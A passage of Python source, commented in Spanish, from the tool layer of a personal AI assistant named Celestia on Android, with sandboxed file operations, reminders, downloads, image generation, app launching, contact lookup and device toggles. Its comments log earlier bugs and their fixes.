
    def crear_archivo(self, ruta: str, contenido: str) -> str:
        try:
            p = self._ruta_segura(ruta)
            if p is None:
                return f"✗ Acceso denegado a '{ruta}': fuera de mis rutas permitidas o archivo sensible."
            p.parent.mkdir(parents=True, exist_ok=True)
            p.write_text(contenido, encoding="utf-8")
            return f"✅ Archivo creado: {p} ({len(contenido)} caracteres)"
        except Exception as e:
            return f"Error al crear archivo: {e}"

    def borrar(self, ruta: str) -> str:
        try:
            p = self._ruta_segura(ruta)
            if p is None:
                return f"✗ Acceso denegado a '{ruta}': fuera de mis rutas permitidas o archivo sensible."
            if not p.exists():
                return f"No existe: {ruta}"
            if p.is_dir():
                shutil.rmtree(p)
                return f"✅ Directorio eliminado: {p}"
            p.unlink()
            return f"✅ Archivo eliminado: {p}"
        except Exception as e:
            return f"Error al borrar: {e}"

    # ── Fase 2: nuevas herramientas ──────────────────────────────────────

    def recordatorio(self, tiempo: str, mensaje: str) -> str:
        if not self._reminder_mgr:
            return "⚠ Sistema de recordatorios no disponible."
        # Sesión 32 (BUG-S109): detectar fechas explícitas imposibles antes
        # de parsear para dar mensaje claro al usuario.
        MESES_NUM = {"enero": 1, "febrero": 2, "marzo": 3, "abril": 4,
                     "mayo": 5, "junio": 6, "julio": 7, "agosto": 8,
                     "septiembre": 9, "setiembre": 9, "octubre": 10,
                     "noviembre": 11, "diciembre": 12}
        m_fec_err = re.match(
            r"(?:el\s+)?(\d{1,2})\s+de\s+(\w+)(?:\s+de\s+(\d{4}))?",
            (tiempo or "").strip().lower())
        if m_fec_err and m_fec_err.group(2).lower() in MESES_NUM:
            d = int(m_fec_err.group(1))
            mes = MESES_NUM[m_fec_err.group(2).lower()]
            anio = int(m_fec_err.group(3)) if m_fec_err.group(3) else None
            if mes == 2:
                bis = (anio is not None and anio % 4 == 0
                       and (anio % 100 != 0 or anio % 400 == 0))
                dmax = 29 if bis or anio is None else 28
            elif mes in (4, 6, 9, 11):
                dmax = 30
            else:
                dmax = 31
            if not (1 <= d <= dmax):
                nombre_mes = m_fec_err.group(2).lower()
                return (f"Esa fecha no existe ({d} de {nombre_mes} no es un día "
                        f"válido). Dime una fecha real, por ejemplo «el 28 de "
                        f"{nombre_mes}».")
        secs = _parse_reminder_time(tiempo)
        if secs is None or secs <= 0:
            return (f"No entendí el tiempo '{tiempo}'. "
                    f"Usa: 'en 30 minutos', 'en 2 horas', 'a las 18:00'.")
        return self._reminder_mgr.add(secs, mensaje)

    def listar_recordatorios(self) -> str:
        """Lista los recordatorios pendientes. Lee del ReminderManager real
        — sin esto, cuando el LLM responde a "qué recordatorios tengo"
        inventa datos (bug sesión 29: usuario crea recordatorio de pastilla
        18:00, Celestia responde "sacar basura 02:07")."""
        if not self._reminder_mgr:
            return "⚠ Sistema de recordatorios no disponible."
        listado = self._reminder_mgr.list_pending()
        if listado.strip() == "No hay recordatorios pendientes.":
            return listado
        return "📋 Recordatorios pendientes:\n" + listado

    def borrar_recordatorio(self, keyword: str = "") -> str:
        """Borra recordatorio(s) que contengan `keyword` en su mensaje.
        Sesión 29: "olvida lo de sacar la basura" → el LLM mentía
        diciendo que no lo tenía. Ahora se borra de verdad.
        """
        if not self._reminder_mgr:
            return "⚠ Sistema de recordatorios no disponible."
        return self._reminder_mgr.remove_by_keyword(keyword)

    def descargar_archivo(self, url: str, ruta: str = "") -> str:
        try:
            if not ruta:
                nombre = url.rstrip("/").split("/")[-1].split("?")[0] or "descarga"
                ruta = str(Path.home() / "Downloads" / nombre)
            p = Path(ruta).expanduser()
            p.parent.mkdir(parents=True, exist_ok=True)
            urllib.request.urlretrieve(url, str(p))
            size = p.stat().st_size
            return f"✅ Descargado: {p} ({size // 1024} KB)"
        except Exception as e:
            return f"Error al descargar: {e}"

    # Extensiones de código y configuración que solo necesitan guardar texto
    _CODIGO_EXTS = {
        "py", "js", "ts", "jsx", "tsx", "mjs", "cjs",
        "lua", "luau",
        "rb", "go", "rs", "cpp", "c", "h", "hpp", "java", "cs", "swift", "kt",
        "php", "r", "scala", "dart", "elm",
        "sh", "bash", "zsh", "fish", "ps1", "bat", "cmd",
        "sql", "graphql", "gql",
        "xml", "yaml", "yml", "toml", "ini", "cfg", "conf",
        "css", "scss", "sass", "less",
        "vue", "svelte", "astro",
        "gd",     # Godot
        "rbxlx",  # Roblox XML (texto)
    }

    def crear_documento(self, tema: str, formato: str = "pdf",
                        contenido: str = "") -> str:
        """
        Crea un documento real con contenido generado.
        Formatos: pdf, docx, txt, md, html, csv, json, código en cualquier lenguaje.
        Otros formatos binarios → señal para que el llamador use el sistema de skills.
        """
        formato = formato.lower().strip().lstrip(".")
        # Sanitizar nombre de archivo
        nombre_base = re.sub(r"[^\w\s-]", "", tema)[:50].strip().replace(" ", "_") or "documento"
        ts = int(time.time())
        ruta_doc = DOCUMENTOS_DIR / f"{nombre_base}_{ts}.{formato}"
        ruta_doc.parent.mkdir(parents=True, exist_ok=True)

        cont = contenido or f"Documento generado por Celestia sobre: {tema}"

        try:
            if formato == "txt":
                ruta_doc.write_text(cont, encoding="utf-8")
                mime = "text/plain"

            elif formato == "md":
                ruta_doc.write_text(cont, encoding="utf-8")
                mime = "text/markdown"

            elif formato == "json":
                try:
                    parsed = json.loads(cont)
                    ruta_doc.write_text(json.dumps(parsed, indent=2, ensure_ascii=False),
                                          encoding="utf-8")
                except Exception:
                    ruta_doc.write_text(cont, encoding="utf-8")
                mime = "application/json"

            elif formato == "csv":
                ruta_doc.write_text(cont, encoding="utf-8")
                mime = "text/csv"

            elif formato == "html":
                try:
                    import markdown as _md
                    html_body = _md.markdown(cont)
                except Exception:
                    html_body = f"<pre>{cont}</pre>"
                ruta_doc.write_text(
                    f"<!DOCTYPE html><html><head><meta charset='utf-8'>"
                    f"<title>{tema}</title></head><body>{html_body}</body></html>",
                    encoding="utf-8")
                mime = "text/html"

            elif formato == "pdf":
                try:
                    from reportlab.lib.pagesizes import A4
                    from reportlab.lib.styles import getSampleStyleSheet
                    from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer
                    from reportlab.lib.units import cm
                except ImportError:
                    return ("✗ Falta reportlab para PDF. Instala con: "
                            "pip3 install --break-system-packages reportlab")
                doc = SimpleDocTemplate(str(ruta_doc), pagesize=A4,
                                          rightMargin=2*cm, leftMargin=2*cm,
                                          topMargin=2*cm, bottomMargin=2*cm)
                styles = getSampleStyleSheet()
                story = [Paragraph(tema, styles["Title"]), Spacer(1, 12)]
                for parrafo in cont.split("\n\n"):
                    parrafo = parrafo.strip()
                    if parrafo:
                        # Escapar caracteres especiales de reportlab
                        seguro = parrafo.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
                        story.append(Paragraph(seguro, styles["BodyText"]))
                        story.append(Spacer(1, 6))
                doc.build(story)
                mime = "application/pdf"

            elif formato in ("docx", "doc"):
                try:
                    from docx import Document
                except ImportError:
                    return ("✗ Falta python-docx para Word. Instala con: "
                            "pip3 install --break-system-packages python-docx")
                d = Document()
                d.add_heading(tema, level=1)
                for parrafo in cont.split("\n\n"):
                    parrafo = parrafo.strip()
                    if parrafo:
                        d.add_paragraph(parrafo)
                d.save(str(ruta_doc))
                mime = "application/vnd.openxmlformats-officedocument.wordprocessingml.document"

            elif formato in self._CODIGO_EXTS:
                # Archivo de código — guardar el contenido tal cual
                ruta_doc.write_text(cont, encoding="utf-8")
                mime = "text/plain"

            else:
                # Formato no soportado directamente
                return f"__APRENDER_FORMATO__:{formato}|{tema}|{cont}"

            size_kb = ruta_doc.stat().st_size // 1024
            return (f"__DOCUMENTO__:{ruta_doc}|{mime}|"
                    f"✓ Creado '{ruta_doc.name}' ({size_kb}KB)")
        except Exception as e:
            return f"✗ Error creando documento: {e}"

    def enviar_archivo(self, ruta: str) -> str:
        """Envía un archivo al usuario por el canal activo (WhatsApp). Acepta rutas relativas."""
        p = Path(ruta).expanduser()
        if not p.is_absolute():
            # Buscar en ubicaciones comunes
            for base in [Path.cwd(), Path("/sdcard"), Path("/sdcard/Download"),
                         SALIDA_DIR, Path.home()]:
                candidato = base / ruta
                if candidato.exists():
                    p = candidato
                    break
        # Validar que la ruta resuelta esté permitida (bloquea path traversal y sensibles)
        p_seguro = self._ruta_segura(str(p))
        if p_seguro is None:
            return f"✗ No puedo enviar '{ruta}': ruta fuera de mis permisos o archivo sensible."
        p = p_seguro
        if not p.exists():
            return f"✗ No encontré el archivo: {ruta}"
        if p.is_dir():
            return f"✗ '{ruta}' es una carpeta. Especifica un archivo concreto."
        # Detectar mimetype básico
        ext = p.suffix.lower()
        mimes = {
            ".pdf": "application/pdf", ".txt": "text/plain", ".csv": "text/csv",
            ".jpg": "image/jpeg", ".jpeg": "image/jpeg", ".png": "image/png",
            ".mp4": "video/mp4", ".mp3": "audio/mpeg", ".zip": "application/zip",
            ".doc": "application/msword",
            ".docx": "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
            ".xlsx": "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
        }
        mime = mimes.get(ext, "application/octet-stream")
        size_kb = p.stat().st_size // 1024
        return f"__DOCUMENTO__:{p}|{mime}|✓ Enviando '{p.name}' ({size_kb}KB)"

    def generar_imagen(self, prompt: str, ancho: int = 1024, alto: int = 1024) -> str:
        """Genera una imagen con Pollinations.ai (gratis, sin clave)."""
        if self.connectivity and not self.connectivity.is_online():
            return "⚠ Necesito conexión a internet para generar imágenes."
        try:
            import urllib.parse
            prompt_safe = urllib.parse.quote(prompt[:500])
            seed = random.randint(1, 99999)
            url = (
                f"https://image.pollinations.ai/prompt/{prompt_safe}"
                f"?width={ancho}&height={alto}&seed={seed}&nologo=true"
            )
            ts = int(time.time())
            nombre = re.sub(r"[^\w]", "_", prompt[:40].lower()).strip("_") or "imagen"
            ruta = IMAGENES_DIR / f"{nombre}_{ts}.jpg"
            ruta.parent.mkdir(parents=True, exist_ok=True)
            req = urllib.request.Request(
                url, headers={"User-Agent": "Mozilla/5.0 (compatible; Celestia/1.5)"}
            )
            # A trozos y con tope: `r.read()` se traía la respuesta ENTERA a la
            # RAM, y aquí pasar de la cuenta despierta al OOM killer. Y a un
            # temporal, para no dejar media imagen con nombre de imagen buena.
            tmp = ruta.with_name(ruta.name + ".parcial")
            leidos = 0
            with urllib.request.urlopen(req, timeout=90) as r, open(tmp, "wb") as f:
                while True:
                    trozo = r.read(256 * 1024)
                    if not trozo:
                        break
                    leidos += len(trozo)
                    if leidos > MAX_IMAGEN_BYTES:
                        f.close()
                        tmp.unlink(missing_ok=True)
                        return (f"✗ La imagen pesa más de {MAX_IMAGEN_BYTES // (1024 * 1024)} MB: "
                                "no me la traigo")
                    f.write(trozo)
            os.replace(tmp, ruta)
            size_kb = ruta.stat().st_size // 1024
            return f"__IMAGEN__:{ruta}|✓ Imagen generada ({size_kb}KB): '{prompt[:60]}'"
        except Exception as e:
            return f"✗ No pude generar la imagen: {e}"

    def buscar_duplicados(self, ruta: str = ".") -> str:
        """Detecta archivos duplicados por hash.

        Optimizado para no colgarse en directorios grandes del sistema:
          - Sandbox: solo escanea rutas permitidas (_ruta_segura).
          - Hash por chunks (no read_bytes completo, evita OOM).
          - Skip de archivos >50MB (duplicar binarios grandes raramente
            tiene sentido; el coste de hashear es alto).
          - Skip de directorios ocultos (.git, __pycache__, node_modules…).
          - Tope de 5000 archivos y 30s de cómputo total.
        """
        import hashlib
        try:
            base = self._ruta_segura(ruta)
            if base is None:
                return f"✗ Acceso denegado a '{ruta}': fuera de mis rutas permitidas."
            if not base.exists():
                return f"Ruta no existe: {ruta}"
            if base.is_file():
                return "Es un archivo, no un directorio."
            MAX_FILE_BYTES = 50 * 1024 * 1024
            MAX_ARCHIVOS = 5000
            # 10s permite que el LLM tenga tiempo de redactar la respuesta sin
            # exceder 60s totales en clientes típicos.
            TIEMPO_LIMITE = 10.0
            CHUNK = 64 * 1024
            EXCLUIR_DIRS = {".git", "__pycache__", "node_modules", ".cache",
                            ".pytest_cache", ".tox", "venv", ".venv", "env",
                            ".mypy_cache"}

            t0 = time.time()
            hashes: Dict[str, List] = {}
            escaneados = 0
            saltados_grandes = 0
            for f in base.rglob("*"):
                # Skip rápidos
                if any(parte in EXCLUIR_DIRS for parte in f.parts):
                    continue
                try:
                    if not f.is_file():
                        continue
                    st = f.stat()
                except (OSError, PermissionError):
                    continue
                if st.st_size == 0:
                    continue
                if st.st_size > MAX_FILE_BYTES:
                    saltados_grandes += 1
                    continue
                # Hash por chunks (no toda la memoria de golpe)
                try:
                    h = hashlib.md5()
                    with open(f, "rb") as fp:
                        while True:
                            buf = fp.read(CHUNK)
                            if not buf:
                                break
                            h.update(buf)
                    hashes.setdefault(h.hexdigest(), []).append(f)
                except (OSError, PermissionError):
                    continue
                escaneados += 1
                # Corte por límite de archivos
                if escaneados >= MAX_ARCHIVOS:
                    break
                # Corte por tiempo (chequear cada 100 archivos para no llamar
                # time.time() en cada iteración)
                if escaneados % 100 == 0 and (time.time() - t0) > TIEMPO_LIMITE:
                    break

            dups = {h: ps for h, ps in hashes.items() if len(ps) > 1}
            dur = time.time() - t0
            cabecera = f"Escaneados {escaneados} archivos en {dur:.1f}s"
            if saltados_grandes:
                cabecera += f" (saltados {saltados_grandes} archivos >50MB)"
            if not dups:
                return f"No se encontraron duplicados en {base}. {cabecera}."
            lines = [f"Encontrados {len(dups)} grupos de duplicados — {cabecera}:"]
            for paths in list(dups.values())[:15]:
                try:
                    size = paths[0].stat().st_size
                except OSError:
                    size = 0
                lines.append(f"  Grupo ({size} B):")
                for p in paths:
                    lines.append(f"    {p}")
            return "\n".join(lines)
        except Exception as e:
            return f"Error: {e}"

    def organizar_archivos(self, ruta: str = ".") -> str:
        try:
            base = Path(ruta).expanduser().resolve()
            if not base.is_dir():
                return f"No es un directorio: {ruta}"
            cats = {
                "Imágenes": {".jpg", ".jpeg", ".png", ".gif", ".webp", ".svg", ".bmp", ".heic"},
                "Vídeos":   {".mp4", ".mkv", ".avi", ".mov", ".webm", ".m4v"},
                "Audio":    {".mp3", ".wav", ".flac", ".ogg", ".m4a", ".aac"},
                "Documentos": {".pdf", ".doc", ".docx", ".txt", ".odt", ".xls", ".xlsx", ".pptx"},
                "Código":   {".py", ".js", ".ts", ".html", ".css", ".json", ".sh", ".cpp", ".c", ".java"},
                "Comprimidos": {".zip", ".tar", ".gz", ".rar", ".7z"},
            }
            movidos, report = 0, []
            for f in list(base.iterdir()):
                if not f.is_file():
                    continue
                for cat, exts in cats.items():
                    if f.suffix.lower() in exts:
                        dest_dir = base / cat
                        dest_dir.mkdir(exist_ok=True)
                        dest = dest_dir / f.name
                        if not dest.exists():
                            f.rename(dest)
                            movidos += 1
                            report.append(f"  {f.name} → {cat}/")
                        break
            if not movidos:
                return "No se movió ningún archivo (ya organizados o sin archivos reconocidos)."
            return f"✅ {movidos} archivos organizados en {base}:\n" + "\n".join(report[:30])
        except Exception as e:
            return f"Error: {e}"

    _APP_MAP = {
        "chrome": "com.android.chrome", "youtube": "com.google.android.youtube",
        "spotify": "com.spotify.music", "whatsapp": "com.whatsapp",
        "telegram": "org.telegram.messenger", "instagram": "com.instagram.android",
        "twitter": "com.twitter.android", "x": "com.twitter.android",
        # Sesión 32 (BUG-S150): aliases coloquiales en español.
        "wp": "com.whatsapp", "wsp": "com.whatsapp", "wasap": "com.whatsapp",
        "guasap": "com.whatsapp", "guasa": "com.whatsapp",
        "insta": "com.instagram.android", "ig": "com.instagram.android",
        "fb": "com.facebook.katana", "face": "com.facebook.katana",
        "yt": "com.google.android.youtube",
        "maps": "com.google.android.apps.maps", "calculadora": "com.google.android.calculator",
        "camara": "com.android.camera2", "cámara": "com.android.camera2",
        "ajustes": "com.android.settings", "configuracion": "com.android.settings",
        "configuración": "com.android.settings", "termux": "com.termux",
        "fotos": "com.google.android.apps.photos", "gmail": "com.google.android.gm",
        "firefox": "org.mozilla.firefox",
        "discord": "com.discord", "tiktok": "com.zhiliaoapp.musically",
        "reloj": "com.google.android.deskclock", "clock": "com.google.android.deskclock",
        "calendario": "com.google.android.calendar", "calendar": "com.google.android.calendar",
        "facebook": "com.facebook.katana",
        # Sesión 32 (BUG-S133): apps cuyo package NO contiene el nombre
        # comercial (Konami → eFootball). Cada vez que el resolver fuzzy
        # falla por esto, añadir aquí.
        "efootball": "jp.konami.pesam", "pes": "jp.konami.pesam",
        "konami": "jp.konami.pesam",
        "netflix": "com.netflix.mediaclient",
        "amazon": "com.amazon.mShop.android.shopping",
        "prime video": "com.amazon.avod.thirdpartyclient",
        "primevideo": "com.amazon.avod.thirdpartyclient",
        "hbo": "com.hbo.hbomax", "hbomax": "com.hbo.hbomax",
        "disney": "com.disney.disneyplus", "disneyplus": "com.disney.disneyplus",
        "google": "com.google.android.googlequicksearchbox",
        "drive": "com.google.android.apps.docs",
        "play store": "com.android.vending", "playstore": "com.android.vending",
        # Sesión 63: los juegos de HoYoverse. El package no se parece al nombre
        # comercial («Nap» es Zenless Zone Zero), así que el resolver fuzzy no
        # llega — y sin esto el jugador no puede comprobar si el juego que le
        # mandan está siquiera abierto. Comprobados instalados en el móvil.
        "zzz": "com.HoYoverse.Nap", "zenless": "com.HoYoverse.Nap",
        "zenless zone zero": "com.HoYoverse.Nap",
        "genshin": "com.miHoYo.GenshinImpact",
        "genshin impact": "com.miHoYo.GenshinImpact",
        "hoyolab": "com.mihoyo.hoyolab",
    }
    # Sesión 32 (BUG-S130): cache de paquetes instalados con TTL 5 min.
    _PKG_CACHE: List[str] = []
    _PKG_CACHE_TS: float = 0.0
    _PKG_CACHE_TTL: float = 300.0
    _RISH_BIN = ("/nonexistent/celestia-sin-movil/rish" if SIN_MOVIL
                 else "/data/data/com.termux/files/usr/bin/rish")

    @classmethod
    def _listar_paquetes_instalados(cls) -> List[str]:
        """Sesión 32 (BUG-S130): devuelve lista de paquetes instalados
        consultando `pm list packages` vía rish. Cacheado 5 min."""
        import subprocess
        import os
        ahora = time.time()
        if cls._PKG_CACHE and (ahora - cls._PKG_CACHE_TS) < cls._PKG_CACHE_TTL:
            return cls._PKG_CACHE
        if not os.path.exists(cls._RISH_BIN):
            return []
        try:
            # Sesión 32: `--user 0` fuerza listar las apps del usuario
            # principal Android. Sin el flag, dependiendo del contexto del
            # proceso, devuelve subset incompleto (en este dispositivo había
            # 214 vs 488 con el flag — faltaban BBVA, juegos, etc.).
            r = subprocess.run(
                [cls._RISH_BIN, "-c",
                 "pm list packages --user 0 2>/dev/null"],
                capture_output=True, text=True, timeout=10,
            )
            pkgs = []
            for line in (r.stdout or "").splitlines():
                line = line.strip()
                if line.startswith("package:"):
                    pkgs.append(line[len("package:"):])
            if pkgs:
                cls._PKG_CACHE = pkgs
                cls._PKG_CACHE_TS = ahora
            return pkgs
        except Exception as e:
            logger.debug("listar_paquetes_instalados falló: %s", e)
            return []

    @classmethod
    def _resolver_app(cls, nombre: str) -> Optional[str]:
        """Sesión 32 (BUG-S130): resolución de app por nombre amigable a
        package id. Orden:
          1. Mapa hardcoded `_APP_MAP` (Chrome, Spotify, etc.).
          2. Si el nombre contiene un punto, asumir que ya ES el package id.
          3. Buscar en paquetes instalados: coincidencia del ÚLTIMO componente
             tras el último punto (com.bbva.bbvacontigo → bbvacontigo).
          4. Coincidencia parcial dentro del último componente o del package
             completo (fuzzy substring).
        """
        nom = (nombre or "").lower().strip()
        if not nom:
            return None
        if nom in cls._APP_MAP:
            return cls._APP_MAP[nom]
        if "." in nom and re.fullmatch(r"[a-z][a-z0-9_.]+", nom):
            return nom
        # Normalizar separadores y quitar acentos básicos.
        nom_norm = re.sub(r"[\s\-_]+", "", nom)
        nom_norm = (nom_norm.replace("á", "a").replace("é", "e")
                            .replace("í", "i").replace("ó", "o")
                            .replace("ú", "u"))
        pkgs = cls._listar_paquetes_instalados()
        # Match exacto del último componente
        for p in pkgs:
            ultimo = p.split(".")[-1].lower()
            if ultimo == nom_norm:
                return p
        # Match prefijo o substring del último componente (mejor coincidencia
        # = más corta, asumiendo que app más simple gana).
        candidatos = []
        for p in pkgs:
            ultimo = p.split(".")[-1].lower()
            if ultimo.startswith(nom_norm) or nom_norm in ultimo:
                candidatos.append(p)
        if candidatos:
            candidatos.sort(key=lambda p: len(p.split(".")[-1]))
            return candidatos[0]
        # Última opción: substring en el paquete completo.
        for p in pkgs:
            if nom_norm in p.lower().replace(".", ""):
                return p
        return None

    def abrir_app(self, app: str) -> str:
        pkg = self._resolver_app(app)
        if not pkg:
            # Mostrar 6 apps de muestra para orientar.
            disponibles = sorted(self._APP_MAP.keys())[:10]
            instaladas = self._listar_paquetes_instalados()
            extra = ""
            if instaladas:
                extra = (f" Tengo {len(instaladas)} apps instaladas — "
                         f"puedes pedirme por nombre exacto o package.")
            return (f"No encontré una app que se llame '{app}'. "
                    f"Conocidas con alias: {', '.join(disponibles)}.{extra}")
        # Sesión 31: SIEMPRE emitir el comando UI [OPEN_APP:pkg] al final.
        # El bridge lo procesa con rish (Shizuku) y abre la app realmente.
        return f"✅ Abriendo {app} ({pkg})... [OPEN_APP:{pkg}]"

    # Sesión 32 (BUG-S132): cache de contactos del teléfono. TTL 10 min.
    _CONTACTOS_CACHE: List[Tuple[str, str]] = []
    _CONTACTOS_CACHE_TS: float = 0.0
    _CONTACTOS_CACHE_TTL: float = 600.0

    @classmethod
    def _listar_contactos(cls) -> List[Tuple[str, str]]:
        """Devuelve [(nombre, número)] consultando vía rish la base de
        contactos de Android. Cacheado 10 min."""
        import os
        ahora = time.time()
        if cls._CONTACTOS_CACHE and (ahora - cls._CONTACTOS_CACHE_TS) < cls._CONTACTOS_CACHE_TTL:
            return cls._CONTACTOS_CACHE
        if not os.path.exists(cls._RISH_BIN):
            return []
        try:
            # Sesión 32: pasar el script por stdin a rish — con `-c "..."`
            # el escape de comillas internas se corrompe y la query devuelve 0
            # bytes. Por stdin rish lo lee como shell normal.
            script = (
                "content query --user 0 "
                "--uri content://com.android.contacts/data "
                "--projection display_name:data1 "
                "--where \"mimetype='vnd.android.cursor.item/phone_v2'\" "
                "2>/dev/null"
            )
            r = subprocess.run(
                [cls._RISH_BIN],
                input=script,
                capture_output=True, text=True, timeout=15,
            )
            contactos: List[Tuple[str, str]] = []
            for line in (r.stdout or "").splitlines():
                m = re.search(r"display_name=(.+?), data1=(.+?)\s*$", line)
                if m:
                    nombre = m.group(1).strip()
                    tel = re.sub(r"[\s\-()]+", "", m.group(2).strip())
                    if nombre and tel:
                        contactos.append((nombre, tel))
            if contactos:
                cls._CONTACTOS_CACHE = contactos
                cls._CONTACTOS_CACHE_TS = ahora
            return contactos
        except Exception as e:
            logger.debug("listar_contactos falló: %s", e)
            return []

    @classmethod
    def _resolver_contacto(cls, nombre: str) -> Optional[Tuple[str, str]]:
        """Busca un contacto por nombre (fuzzy). Devuelve (nombre, número)
        o None. Si `nombre` ya parece un número, lo devuelve directo."""
        nom = (nombre or "").strip()
        if not nom:
            return None
        # ¿Ya es un número?
        if re.fullmatch(r"\+?\d[\d\s\-()]{4,}", nom):
            return (nom, re.sub(r"[\s\-()]+", "", nom))
        nom_low = nom.lower()
        contactos = cls._listar_contactos()
        # Match exacto case-insensitive del nombre completo
        for n, t in contactos:
            if n.lower() == nom_low:
                return (n, t)
        # Match de primera palabra (nombre de pila)
        for n, t in contactos:
            primera = n.split()[0].lower() if n.split() else ""
            if primera == nom_low:
                return (n, t)
        # Substring
        for n, t in contactos:
            if nom_low in n.lower():
                return (n, t)
        return None

    def llamar(self, contacto: str) -> str:
        """Llama a un contacto por nombre o a un número directo.
        Sesión 32 (BUG-S132)."""
        resuelto = self._resolver_contacto(contacto)
        if not resuelto:
            return (f"No encontré ningún contacto que se llame «{contacto}». "
                    f"Dime el número directamente (con +34 si es de España) o "
                    f"el nombre exacto como aparece en tus contactos.")
        nombre, tel = resuelto
        return f"📞 Llamando a {nombre} ({tel})... [CALL:{tel}]"

    def enviar_mensaje(self, contacto: str, mensaje: str,
                       app: str = "whatsapp") -> str:
        """Sesión 32 (BUG-S132): abre el compositor de la app indicada
        (WhatsApp, Telegram, SMS, Signal) con destinatario y texto
        pre-cargados. El usuario debe pulsar enviar — nunca auto-envía.

        Apps soportadas: whatsapp, telegram, sms, signal.
        Instagram no se soporta porque no expone intent público para DMs.
        """
        if not mensaje or not mensaje.strip():
            return "Necesito el texto del mensaje que quieres enviar."
        app_norm = (app or "whatsapp").lower().strip()
        # Aliases
        if app_norm in ("wa", "whats", "whatsapp", "wsp", "guasap"):
            app_norm = "whatsapp"
        elif app_norm in ("tg", "telegram"):
            app_norm = "telegram"
        elif app_norm in ("sms", "mensaje de texto", "texto"):
            app_norm = "sms"
        elif app_norm in ("signal",):
            app_norm = "signal"
        elif app_norm in ("instagram", "ig", "insta"):
            return ("Instagram no permite enviar DMs desde fuera de la app. "
                    "Lo único que puedo hacer es abrirte Instagram y tendrás "
                    "que escribirlo tú.")
        else:
            return (f"No conozco la app «{app}». Soportadas: WhatsApp, "
                    f"Telegram, SMS, Signal.")

        resuelto = self._resolver_contacto(contacto)
        if not resuelto:
            return (f"No encontré ningún contacto que se llame «{contacto}». "
                    f"Dime el número o el nombre exacto.")
        nombre, tel = resuelto
        # Limpiar el teléfono para los esquemas que esperan solo dígitos (wa.me).
        tel_digits = re.sub(r"\D", "", tel)
        import urllib.parse as _up
        msg_enc = _up.quote(mensaje)

        if app_norm == "whatsapp":
            url = f"https://wa.me/{tel_digits}?text={msg_enc}"
            return (f"💬 Abriendo WhatsApp a {nombre} ({tel}) con tu mensaje. "
                    f"Sólo tienes que pulsar enviar. [OPEN_URL:{url}]")
        if app_norm == "telegram":
            # tg://resolve?phone=X abre el chat; el texto NO se puede
            # pre-cargar fiablemente con un número (solo con username).
            url = f"tg://resolve?phone={tel_digits}"
            return (f"✈️ Abriendo Telegram al chat con {nombre} ({tel}). "
                    f"Telegram no permite pre-cargar texto por número, así "
                    f"que escribe «{mensaje}» tú. [OPEN_URL:{url}]")
        if app_norm == "signal":
            # Signal: smsto: con package signal abre Signal si está instalado
            return (f"🔒 Abriendo Signal a {nombre} ({tel}). El texto se "
                    f"pre-carga. [SMS:{tel}|{mensaje}]")
        # SMS clásico
        return (f"✉️ Abriendo SMS a {nombre} ({tel}) con tu mensaje. "
                f"Sólo tienes que pulsar enviar. [SMS:{tel}|{mensaje}]")

    def abrir_url(self, url: str) -> str:
        """Abre una URL en el navegador por defecto. Sesión 32 (BUG-S132)."""
        u = (url or "").strip()
        if not u:
            return "Dime la URL que quieres abrir."
        if not re.match(r"^https?://", u, re.I):
            u = "https://" + u
        if not re.match(r"^https?://[\w\-._~:/?#\[\]@!$&'()*+,;=%]+$", u, re.I):
            return f"La URL «{url}» no parece válida."
        if not ES_ANDROID:
            # En un ordenador el navegador está aquí mismo: se abre de verdad.
            import webbrowser
            try:
                if webbrowser.open(u):
                    return f"🌐 Abierto en tu navegador: {u}"
            except Exception:
                pass
            return f"No he podido abrir el navegador. Aquí tienes el enlace: {u}"
        return f"🌐 Abriendo {u}... [OPEN_URL:{u}]"

    # Sesión 32 (BUG-S134): controles del dispositivo. Emiten tokens UI que
    # el bridge ejecuta vía Shizuku/rish.
    def toggle_wifi(self, estado: str = "toggle") -> str:
        st = (estado or "toggle").lower().strip()
        if st in ("on", "encender", "encendido", "activar"):
            return f"📶 Encendiendo WiFi... [TOGGLE_WIFI:on]"
        if st in ("off", "apagar", "apagado", "desactivar"):
            return f"📶 Apagando WiFi... [TOGGLE_WIFI:off]"
        return f"📶 Cambiando estado WiFi... [TOGGLE_WIFI]"

    def toggle_bluetooth(self, estado: str = "toggle") -> str:
        st = (estado or "toggle").lower().strip()
        if st in ("on", "encender", "encendido", "activar"):
            return f"📡 Encendiendo Bluetooth... [TOGGLE_BT:on]"
        if st in ("off", "apagar", "apagado", "desactivar"):
            return f"📡 Apagando Bluetooth... [TOGGLE_BT:off]"
        return f"📡 Cambiando estado Bluetooth... [TOGGLE_BT]"

    def toggle_linterna(self, estado: str = "toggle") -> str:
        st = (estado or "toggle").lower().strip()
        if st in ("on", "encender", "encendido", "activar"):
            return f"🔦 Encendiendo linterna... [TOGGLE_FLASHLIGHT:on]"
        if st in ("off", "apagar", "apagado", "desactivar"):
            return f"🔦 Apagando linterna... [TOGGLE_FLASHLIGHT:off]"
        return f"🔦 Cambiando estado linterna... [TOGGLE_FLASHLIGHT]"

    def toggle_avion(self, estado: str = "toggle") -> str:
        st = (estado or "toggle").lower().strip()
        if st in ("on", "encender", "encendido", "activar"):
            return f"✈️ Activando modo avión... [TOGGLE_AIRPLANE:on]"
        if st in ("off", "apagar", "apagado", "desactivar"):
            return f"✈️ Desactivando modo avión... [TOGGLE_AIRPLANE:off]"
        return f"✈️ Cambiando modo avión... [TOGGLE_AIRPLANE]"

    def cambiar_volumen(self, accion: str = "up") -> str:
        """accion: up, down, mute, o N (0-100)."""
        a = (accion or "up").lower().strip()
        if a in ("up", "subir", "sube", "más", "mas"):
            return f"🔊 Subiendo volumen... [VOLUME:up]"
        if a in ("down", "bajar", "baja", "menos"):
            return f"🔉 Bajando volumen... [VOLUME:down]"
        if a in ("mute", "silenciar", "silencio", "silenciado"):
            return f"🔇 Silenciando... [VOLUME:mute]"
        m = re.match(r"(\d{1,3})%?$", a)
        if m:
            n = max(0, min(100, int(m.group(1))))
            return f"🔊 Volumen al {n}%... [VOLUME:{n}]"
        return f"No entiendo la acción de volumen «{accion}»."

    def cambiar_brillo(self, nivel: str = "50") -> str:
        """nivel: 0-100 (%) o 'up', 'down', 'max', 'min'."""
        n = (nivel or "50").lower().strip()
        if n in ("max", "máximo", "maximo", "100"):
            return f"☀️ Brillo al máximo... [BRIGHTNESS:255]"
        if n in ("min", "mínimo", "minimo", "0"):
